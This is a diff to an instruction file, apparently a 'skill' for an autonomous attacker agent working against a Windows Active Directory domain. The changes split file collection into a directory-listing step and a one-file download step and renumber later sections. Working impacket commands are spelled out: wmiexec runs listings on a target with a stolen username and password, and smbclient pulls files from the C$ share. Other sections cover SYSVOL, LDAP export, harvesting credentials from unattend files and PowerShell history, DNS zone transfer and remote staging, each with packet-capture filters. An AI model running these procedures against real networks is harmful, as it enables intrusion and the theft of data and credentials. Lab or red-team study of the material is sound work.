@@ -1,6 +1,6 @@
 ---
 name: ad-collection
-description: Collection-phase Active Directory skill for an attacker agent on a domain-joined Windows host. Covers share download, SYSVOL/GPO, LDAP export, unattend and PowerShell history, DNS zone transfer, remote staging, and archiving. Load this skill when the task names ad-collection. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
+description: Collection-phase Active Directory skill for an attacker agent on a domain-joined Windows host. Covers share download, remote file search, single-file download, SYSVOL/GPO, LDAP export, unattend and PowerShell history, DNS zone transfer, remote staging, and archiving. Load this skill when the task names ad-collection. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
 ---
 
 # AD Collection Skill
@@ -51,29 +51,31 @@ ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 ||
 ```
 
 
-## 4.2 Local File Collection
-- Technique id: `collection.local-file`
-- ATT&CK: T1005 (Data from Local System)
+## 4.2 Remote File Search
+- Technique id: `collection.remote-file-search`
+- ATT&CK: T1083 (File and Directory Discovery)
 
-Purpose: enumerate and retrieve files of interest from a compromised host's local filesystem.
+Purpose: list files on a compromised host. Do not download them in this technique.
 
 Inputs: a user object with `password` from `users`, plus the target host.
 
-Procedure (one atomic action — list via remote shell, then download):
+Procedure (one atomic action — one read-only directory listing):
 
 ```
-python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'dir /s /b C:\Users'
+python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> "cmd /c dir /s /b C:\Users & dir /s /b C:\HolyFW"
 ```
 
-Then use `smbclient` (`use C$`) to `get` the chosen file.
-
-Outputs:
+Read the existing `hosts[<index>].discovered_files` list, add each new path with `"collected": false`, and keep entries that are already `"collected": true`. Then replace the list:
 
 ```
-python scripts/state.py add files '{"path": "<local-download-path>", "description": "collected from <target-ip> <remote-path>"}'
+python scripts/state.py set hosts[<index>].discovered_files '<json array>'
 ```
 
-Rollback: if a file moves, `mark-stale` the entry and re-run.
+Item shape: `{"path": "C:\\HolyFW\\Documents\\Finance\\annual-report.bin", "collected": false}`.
+
+Outputs: the updated `discovered_files` list. Do not add a `files[]` entry until a later `collection.local-file-download`.
+
+Rollback: if the host rejects the login, `mark-stale` the credential and retry with another user already in `users`.
 
 Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:
 
@@ -84,11 +86,50 @@ python scripts/write_filter.py --expression "<filled display filter>"
 Template:
 
 ```
-ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135)
+ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
 ```
 
 
-## 4.3 Archive Collected Data
+## 4.3 Local File Download
+- Technique id: `collection.local-file-download`
+- ATT&CK: T1005 (Data from Local System)
+
+Purpose: download one file that this host already lists in `discovered_files` with `collected` not true. Do not enumerate the disk in this technique.
+
+Inputs: a user object with `password` from `users`, the target host, and the `path` intent from the task text. The path must already be present on that host's `discovered_files`.
+
+Procedure (one atomic action — `smbclient` `use C$`, then `get` that one path):
+
+```
+python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
+```
+
+Inside: `use C$`, `get <path>`, `exit`.
+
+Outputs:
+
+```
+python scripts/state.py add files '{"path": "<local-download-path>", "description": "collected from <target-ip> <remote-path>"}'
+```
+
+Set `"collected": true` on the matching `discovered_files` entry and write the list back with `state.py set`.
+
+Rollback: if the file is gone, remove it from `discovered_files` and mark the technique `failed`.
+
+Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:
+
+```
+python scripts/write_filter.py --expression "<filled display filter>"
+```
+
+Template:
+
+```
+ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 || tcp.port == 139)
+```
+
+
+## 4.4 Archive Collected Data
 - Technique id: `collection.archive`
 - ATT&CK: T1560 (Archive Collected Data), T1560.001 (Archive via Utility)
 
@@ -130,7 +171,7 @@ frame.number == 0
 ```
 
 
-## 4.4 SYSVOL Collection
+## 4.5 SYSVOL Collection
 
 - Technique id: `collection.sysvol`
 - ATT&CK: T1039 (Data from Network Shared Drive)
@@ -168,7 +209,7 @@ ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || tcp.port == 445 || tcp
 ```
 
 
-## 4.5 GPO Preference Files
+## 4.6 GPO Preference Files
 
 - Technique id: `collection.gpo-files`
 - ATT&CK: T1615 (Group Policy Discovery), T1039 (Data from Network Shared Drive)
@@ -206,7 +247,7 @@ ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || tcp.port == 445 || tcp
 ```
 
 
-## 4.6 LDAP Directory Export
+## 4.7 LDAP Directory Export
 
 - Technique id: `collection.ldap-export`
 - ATT&CK: T1213 (Data from Information Repositories)
@@ -244,7 +285,7 @@ ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || kerberos || tcp.port 
 ```
 
 
-## 4.7 Unattend / Sysprep Files
+## 4.8 Unattend / Sysprep Files
 
 - Technique id: `collection.unattend`
 - ATT&CK: T1552.001 (Unsecured Credentials: Credentials In Files)
@@ -282,7 +323,7 @@ ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 ||
 ```
 
 
-## 4.8 PowerShell Console History
+## 4.9 PowerShell Console History
 
 - Technique id: `collection.ps-history`
 - ATT&CK: T1552.001 (Unsecured Credentials: Credentials In Files)
@@ -320,7 +361,7 @@ ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 ||
 ```
 
 
-## 4.9 DNS Zone Transfer / Enum
+## 4.10 DNS Zone Transfer / Enum
 
 - Technique id: `collection.dns-zone`
 - ATT&CK: T1071.004 (Application Layer Protocol: DNS), T1046 (Network Service Discovery)
@@ -362,7 +403,7 @@ Template:
 ```
 
 
-## 4.10 Remote Staging
+## 4.11 Remote Staging
 
 - Technique id: `collection.remote-stage`
 - ATT&CK: T1074.002 (Data Staged: Remote Data Staging)
